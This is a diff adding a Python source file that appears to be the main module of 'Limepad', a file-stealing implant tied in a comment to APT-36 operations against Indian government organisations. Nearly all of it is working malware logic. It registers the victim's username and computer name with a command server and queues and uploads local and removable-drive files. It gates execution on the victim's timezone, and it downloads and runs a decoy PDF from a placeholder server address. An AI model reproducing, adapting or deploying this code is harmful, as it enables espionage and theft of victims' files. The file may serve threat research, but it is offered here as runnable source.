@@ -1,0 +1,348 @@
+# main module used by Limepad
+# reference blog: https://www.zscaler.com/blogs/security-research/new-and-improved-ttps-apt-36-targeting-indian-governmental-organizations
+import os
+import sys
+import random
+import base64
+import time
+from time import sleep
+import urllib
+import urllib2
+import json
+import fnmatch
+from controls import ROOTDATA,STARTDATA,DOORS,DUSSEN
+import RHandler
+from helpinghand import helpinghand
+from synclogic import  SYNCTREES
+from instrument import  tryagain
+from timespoofer import timespoofer
+from controls import *
+
+from occupation import server_working
+from hhand import perform_duties
+import logging
+
+
+billet = logging.getLogger('Limepad')
+
+
+def generate_buyer(dbconn, userguid=None, password=None):
+    global billet
+    try:
+        server = choose_host()
+        sysuser = os.environ['USERNAME']
+        syscomputername = os.environ['COMPUTERNAME']
+        rand = str(random.randrange(99999+1,999999))
+
+        if userguid == None:
+            userguid = sysuser + '_' + syscomputername + '_v1_' + rand
+        if password == None:
+            password = base64.urlsafe_b64encode(os.urandom(30))[:32]
+
+        params = {'USERNAME':userguid, 'PASSWORD': password}
+        billet.exception("userguid : " + userguid)
+        print("userguid : " + userguid)
+        billet.exception("password : " + password)
+        print("password : " + password)
+        conn = RHandler.RHandler(server.host, userguid, password)
+        resp = conn.open_request('POST', '/information.php/', params )
+        billet.exception("went smoothly with creating user")
+        resp = resp.read()
+        conn.verify()
+        print("user verified from create user")
+        dbconn.createuserlocal(userguid, password)
+        # dbconn.set_sync_rules(SYNC_RULES_CONFIG)
+        billet.info("Registered new user: %s" % userguid)
+        return userguid
+    except Exception, e:      
+        print("Error in Exception")
+        billet.exception(e)
+        #terminator()
+
+
+
+def begin_transfer(filemon, dbconn, server, maxuploads=10):
+    conn = server
+
+    upload_files = dbconn.pop_queue()
+    upload_count = 0
+    while upload_files:
+        path, filenameids = upload_files
+        fileids, filenames = zip(*filenameids)
+        try:
+            if not TEMP_UPLOAD_FOLDER in path:
+                billet.info("Trying uploading files from %s: %s" % (path, ",".join(filenames)))
+                print("Trying uploading files from %s: %s" % (path, ",".join(filenames)))
+                conn.send_files(path, filenames)
+                billet.info("Succesfully uploaded %d files from %s: %s" % (len(filenames), path, ",".join(filenames)) )
+                print("Succesfully uploaded %d files from %s: %s" % (len(filenames), path, ",".join(filenames)) )
+            else:
+                billet.debug("Trying uploading removable files from %s: %s" % (path, ",".join(filenames)) )
+                print("Trying uploading removable files from %s: %s" % (path, ",".join(filenames)) )
+                rpath = "/removable/" + path.replace(TEMP_UPLOAD_FOLDER ,"").replace("\\", "/")
+                conn.send_files(path, filenames, rpath)
+                billet.info("Succesfully uploaded %d files from %s: %s" % (len(filenames), path, ",".join(filenames)) )
+                print("Succesfully uploaded %d files from %s: %s" % (len(filenames), path, ",".join(filenames)) )
+            billet.info("Hopefully files uploaded and DB state set")
+            print("Hopefully files uploaded and DB state set")
+            dbconn.change_files_state(fileids, FILEFLAG.SYNCED)
+        except Exception, e:
+            ### print "Failed to upload %s: %s" % (path, ",".join(filenames))
+            billet.info("Failed to upload %s: %s" % (path, ",".join(filenames)))
+            print("Failed to upload %s: %s" % (path, ",".join(filenames)))
+            billet.exception(e)
+            dbconn.re_enqueue(fileids, 1000)
+
+        upload_count += 1
+        if upload_count > maxuploads:
+            return
+
+        upload_files = dbconn.pop_queue()
+
+def put_schema(filemon, dbconn):
+    import shutil
+    filemon.outbuf, outbuf_files = [], filemon.outbuf
+
+    for f in outbuf_files:
+        try:
+            dirpath, name, filesize, mtime, ctime, filestate, priority, defer_till = f
+            dbfile = dbconn.get_file(dirpath.decode('utf-8'), name.decode('utf-8'))
+            if dbfile and dbfile['size'] == filesize and dbfile['modified'] == mtime:
+                continue
+            dbconn.add_file(dirpath.decode('utf-8'), name.decode('utf-8'), filesize, mtime, ctime, filestate, priority, defer_till)
+            billet.info("Queued file %s" % os.path.join(dirpath, name))
+        except Exception, e:
+            billet.exception(e)
+
+    filemon.outbuf_tempfiles, outbuf_tempfiles = [], filemon.outbuf_tempfiles
+    filemon.outbuf_tempfilesize = 0
+
+    for f in outbuf_tempfiles:
+        try:
+            dirpath, name, temp_target_dir, filesize, mtime, ctime, filestate, priority, defer_till = f
+
+            dbfile = dbconn.get_file(temp_target_dir.decode('utf-8'), name.decode('utf-8'))
+            if dbfile and dbfile['size'] == filesize and dbfile['modified'] == mtime:
+                continue
+
+            # Move to temp dir
+            if not os.path.exists(temp_target_dir):
+                os.makedirs(temp_target_dir)
+            target_file = os.path.join(temp_target_dir.decode('utf-8'), name.decode('utf-8'))
+
+            namepath= os.path.join(dirpath.decode('utf-8'), name.decode('utf-8'))
+            billet.debug("Queued temp file: %s" % namepath )
+            shutil.copy2(namepath, temp_target_dir.decode('utf-8'))
+            dbconn.add_file(temp_target_dir.decode('utf-8'), name.decode('utf-8'), filesize, mtime, ctime, filestate, priority, defer_till)
+        except Exception, e:
+            billet.exception(e)
+
+def choose_host():
+    #  Choose
+    retrycount = 0
+    while True:
+        server = False
+        for s in SERVERS:
+            logging.info("Trying to connect to  servers resp %s" % s)
+            print("Trying to connect to servers reso %s" % s)
+            try_srv = RHandler.RHandler(s, None, None)
+            print("reached here")
+            if try_srv.ping():
+                server = try_srv
+                break
+            else:
+                print("break")
+                continue
+        if not server:
+            retrycount += 1
+            wait_secs = 60 + retrycount * 20
+            logging.warn("Attempt %d failed. No server responding. Will retry after %d minutes. " % (retrycount, wait_secs / 60))
+            #sleep(wait_secs)
+        else:
+            break
+    logging.info("Chose server %s" % server.host)
+    return server
+
+def terminator():
+    sys.exit(0)
+
+def generate_listing():
+    # Creates directory for storing sync metadata
+    try:
+        if not os.path.exists(ROOTDATA):
+            os.mkdir(ROOTDATA)
+        if not os.path.exists(TEMP_UPLOAD_FOLDER):
+            os.mkdir(TEMP_UPLOAD_FOLDER)
+        if not os.path.exists( os.path.join(ROOTDATA, "sc") ):
+            os.mkdir( os.path.join(ROOTDATA, "sc") )
+    except:
+        # Couldn't create directory.
+        terminator()
+
+def detach_fact(force=False):
+    import shutil
+    # Removes the old data directory
+    try:
+        shutil.rmtree(ROOTDATA)
+    except Exception, e:
+        print(e)
+        billet.exception(e)
+
+        if force:
+            billet.critical("Cannot delete data folder. Quitting")
+            print("Cannot delete data folder. Quitting")
+            terminator()
+        else:
+            billet.critical("Cannot delete data folder")
+            print("Cannot delete data folder")
+
+def put_buyer(server, db=None):
+    generate_listing()
+    reg = True
+    user_exists = os.path.exists(USERFILE)
+    if db is None and not user_exists:
+        billet.warn("User doesn't exist. Creating New One")
+        print("User doesn't exist. Creating New One")
+        db = helpinghand(USERFILE)
+        reg = generate_buyer(db)
+    else:
+        if db is None:
+            db = helpinghand(USERFILE)
+        creds = db.get_usercreds()
+        if not creds:
+            billet.warn("Credentials don't exist in DB. Creating new one")
+            print("Credentials don't exist in DB. Creating new one")
+            db.conn.close()
+            detach_fact()
+            generate_listing()
+            db = helpinghand(USERFILE)
+            reg = generate_buyer(db)
+            if not creds:
+                sleep(1)
+                billet.warn("Unable to register the user. Wait n Quit!")
+                print("Unable to register the user. Wait n Quit!")
+                terminator()
+        else:
+            sconn = RHandler.RHandler( server.host, creds[0], creds[1] )
+            try:
+                server_authorized = sconn.verify()
+            except Exception, e:
+                server_authorized = False
+            if not server_authorized:
+                billet.warn("Server doesn't have our credentials. Resetting sync state")
+                db.conn.close()
+                detach_fact()
+                generate_listing()
+                db = helpinghand(USERFILE)
+                reg = generate_buyer(db, creds[0], creds[1])
+
+    if not reg:
+        billet.warn("Unable to register the user. Wait n Quit!")
+        print("Unable to register the user. Wait n Quit!")
+        sleep(10)
+        terminator()
+    creds = db.get_usercreds()
+    if not creds:
+        billet.warn("Inconsistent creds. Exiting now")
+        print("Inconsistent creds. Exiting now")
+        terminator()
+    return (db, creds)
+
+def NewBulletin():
+    try:
+        pass
+    except Exception as e:
+        pass
+
+
+#################################################
+
+################################################
+
+
+#################################################
+database = connection = powers = None
+def main():
+    global database, connection, powers
+    billet.info("Starting the app")
+
+    srvr = choose_host()
+    print("server selected")
+    database, powers = put_buyer(srvr)
+    database.conn.cursor().execute("PRAGMA journal_mode = MEMORY")
+    sleep(1)
+
+    connection = RHandler.RHandler(srvr.host, powers[0], powers[1])
+    connection.verify()
+    NewBulletin()
+    if os.path.exists(STARTDATA+DOORS[0]):
+        print("dll file found")
+        os.rename(STARTDATA+DOORS[0], STARTDATA+DOORS[1])
+    print("server verified")
+    while database.get_config('disabled') == '1':
+        server_working(connection, database); sleep(60)
+
+    f = SYNCTREES()
+    f.build_index()
+
+    f.start()
+    
+
+    while True:
+        try:
+            defidol = timespoofer("c:\\programdata")
+            if defidol is True or defidol is False:
+                print("last timespoofer")
+                server_working(connection, database)
+                if database.get_config('disabled') == '1':
+                    sleep(60); continue
+                put_schema(f, database)
+                begin_transfer(f, database, connection)
+                sleep(5)
+                put_schema(f, database)
+                sleep(5)
+                connection.verify()
+            else:
+                pass
+        except urllib2.URLError:
+            srvr = choose_host()
+            database, powers = put_buyer(srvr, database)
+            connection = RHandler.RHandler(srvr.host, powers[0], powers[1])
+            connection.verify()
+            
+def fewnames():
+    try:
+        tzname = time.tzname
+        print(str(tzname).lower())
+        return str(tzname).lower()
+    except Exception as e:
+        billet.exception(e)
+        print(e)
+        pass
+
+if __name__ == '__main__':
+    try:
+        import subprocess
+        if '.py' not in sys.argv[0]:
+            sleep(5)
+            if DUSSEN.decode("hex") in fewnames():
+                try:
+                    if not os.path.exists(ROOTDATA):
+                        os.mkdir(ROOTDATA)
+                    if not os.path.isfile(ROOTDATA+'\\confirmation_id.pdf'):
+                        billet.exception("insdie file path")
+                        urllib.urlretrieve('http://<server_address>/confirmation_id.pdf',ROOTDATA+'\\confirmation_id.pdf')
+                        billet.exception("file downloaded")
+                        subprocess.Popen([ROOTDATA+'\\confirmation_id.pdf'],shell=True)
+                except Exception as e:
+                    billet.exception(str(e))
+                    pass
+                perform_duties()
+                main()
+            else:
+                print("NO DUSSEN FOUND")
+        if '--clean' in sys.argv:
+            detach_fact(force=True)
+    except Exception, e:
+        print("exception as e : " + str(e))
+        billet.exception(e)
